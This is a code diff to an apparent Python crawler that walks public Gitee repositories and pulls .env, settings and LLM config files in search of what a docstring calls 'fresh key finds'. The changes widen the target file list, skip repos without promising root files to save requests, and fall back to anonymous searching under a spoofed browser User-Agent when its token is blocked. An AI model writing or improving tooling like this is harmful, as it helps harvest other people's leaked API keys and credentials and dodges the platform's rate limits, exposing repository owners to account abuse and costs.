@@ -23,6 +23,7 @@ import asyncio
 import base64
 import hashlib
 import logging
+import math
 
 import httpx
 
@@ -60,8 +61,10 @@ _TARGET_PATHS = [
     ".env.production",
     ".env.development",
     ".env.staging",
+    ".env.backup",
     "config.py",
     "settings.py",
+    "api_config.py",
     "config/config.py",
     "app/config.py",
     "src/config.py",
@@ -91,6 +94,10 @@ _TARGET_PATHS = [
     # .NET
     "appsettings.json",
     "appsettings.Development.json",
+    # Chinese AI project patterns (LLM config files)
+    "llm_config.yaml",
+    "model_config.json",
+    "deploy/.env",
 ]
 
 # Keyword queries for /api/v5/search/repositories — catches community repos
@@ -172,11 +179,17 @@ async def _check_token(client: httpx.AsyncClient, token: str) -> bool:
 
 async def _list_repos(client: httpx.AsyncClient,
                       kind: str, name: str, token: str) -> list[dict]:
-    """List all public repos for an org or user."""
+    """List all public repos for an org or user.
+
+    Uses X-Total header from first page to calculate exact page count —
+    avoids blind 10-page cap (cuts large orgs, wastes requests on small ones).
+    """
     url = (f"{_BASE}/orgs/{name}/repos" if kind == "org"
            else f"{_BASE}/users/{name}/repos")
     all_repos = []
-    for page in range(1, _MAX_REPO_PAGES + 1):
+    max_pages = _MAX_REPO_PAGES  # recalculated after first page
+
+    for page in range(1, max_pages + 1):
         try:
             r = await client.get(
                 url,
@@ -185,7 +198,7 @@ async def _list_repos(client: httpx.AsyncClient,
                 timeout=20,
             )
             if r.status_code == 404:
-                break  # org/user doesn't exist
+                break
             if r.status_code in (401, 403):
                 _TOKEN_STATUS[token[:8]] = {"alive": False}
                 break
@@ -195,6 +208,16 @@ async def _list_repos(client: httpx.AsyncClient,
             if not isinstance(batch, list) or not batch:
                 break
             all_repos.extend(batch)
+
+            # Recalculate page cap from X-Total header on first page
+            if page == 1:
+                try:
+                    total = int(r.headers.get("X-Total", 0))
+                    if total > 0:
+                        max_pages = min(math.ceil(total / 100), _MAX_REPO_PAGES)
+                except (ValueError, TypeError):
+                    pass
+
             if len(batch) < 100:
                 break
             await asyncio.sleep(_PAGE_SLEEP)
@@ -204,19 +227,30 @@ async def _list_repos(client: httpx.AsyncClient,
     return all_repos
 
 
+_ANON_UA = {
+    "User-Agent": (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+    )
+}
+
+
 async def _search_repos(client: httpx.AsyncClient,
                         query: str, token: str) -> list[dict]:
     """Search public repos by keyword via /search/repositories.
 
-    No auth required but token prevents anonymous rate-limiting.
-    Returns repos sorted by most recently updated (best for fresh key finds).
+    No auth required — if token returns 401/403, retries without Authorization
+    so search keeps working even when the token slot is dead.
     """
     all_repos = []
+    use_auth = True  # flip to False on first auth failure
+
     for page in range(1, _SEARCH_PAGES + 1):
+        hdrs = _headers(token) if use_auth else _ANON_UA
         try:
             r = await client.get(
                 f"{_BASE}/search/repositories",
-                headers=_headers(token),
+                headers=hdrs,
                 params={
                     "q":        query,
                     "per_page": 100,
@@ -227,8 +261,12 @@ async def _search_repos(client: httpx.AsyncClient,
                 timeout=20,
             )
             if r.status_code in (401, 403):
-                _TOKEN_STATUS[token[:8]] = {"alive": False}
-                break
+                if use_auth:
+                    _TOKEN_STATUS[token[:8]] = {"alive": False}
+                    use_auth = False
+                    log.debug("gitee search: token dead, retrying anon for '%s'", query)
+                    continue  # retry same page without auth
+                break  # anon also failed — give up
             if r.status_code != 200:
                 break
             data = r.json()
@@ -333,12 +371,68 @@ async def _scan_file(full_name: str, path: str, content: str,
                 )
 
 
+# Root-level names that suggest config/env files may exist deeper.
+# Presence of any of these in the root listing unlocks full path scan.
+_INTERESTING_ROOT_FILES = {
+    ".env", ".env.local", ".env.example", ".env.production",
+    ".env.development", ".env.staging", ".env.backup",
+    "config.py", "settings.py", "api_config.py",
+    "config.yaml", "config.yml", "config.json", "config.toml",
+    "config.ts", "config.js",
+    "docker-compose.yml", "docker-compose.yaml",
+    "Makefile", "application.yml", "application.yaml",
+    "application.properties", "bootstrap.yml",
+    "appsettings.json", "llm_config.yaml", "model_config.json",
+}
+_INTERESTING_ROOT_DIRS = {
+    "config", "src", "app", "core", "deploy",
+    ".github", "conf", "settings",
+}
+
+
+async def _has_interesting_root(client: httpx.AsyncClient,
+                                full_name: str, token: str) -> bool:
+    """Fetch repo root listing; return True if it looks worth scanning.
+
+    Saves ~80% of file-fetch requests by skipping pure-docs / empty repos.
+    Falls back to True on any error so we never silently miss a repo.
+    """
+    try:
+        r = await client.get(
+            f"{_BASE}/repos/{full_name}/contents/",
+            headers=_headers(token),
+            timeout=10,
+        )
+        if r.status_code != 200:
+            return True  # can't tell — scan anyway
+        entries = r.json()
+        if not isinstance(entries, list):
+            return True
+        for entry in entries:
+            name = entry.get("name", "")
+            kind = entry.get("type", "")
+            if kind == "file" and name in _INTERESTING_ROOT_FILES:
+                return True
+            if kind == "dir" and name in _INTERESTING_ROOT_DIRS:
+                return True
+        return False
+    except Exception:
+        return True  # network error — scan anyway
+
+
 async def _scan_repo(client: httpx.AsyncClient, repo: dict,
                      sem: asyncio.Semaphore, token: str):
     """Fetch and scan all target file paths in a repo."""
     full_name = repo.get("full_name", "")
     if not full_name:
         return
+
+    async with sem:
+        interesting = await _has_interesting_root(client, full_name, token)
+    if not interesting:
+        log.debug("gitee skip (no interesting root): %s", full_name)
+        return
+
     stars    = repo.get("stargazers_count", 0) or 0
     base_url = f"https://gitee.com/{full_name}/blob/master"
 
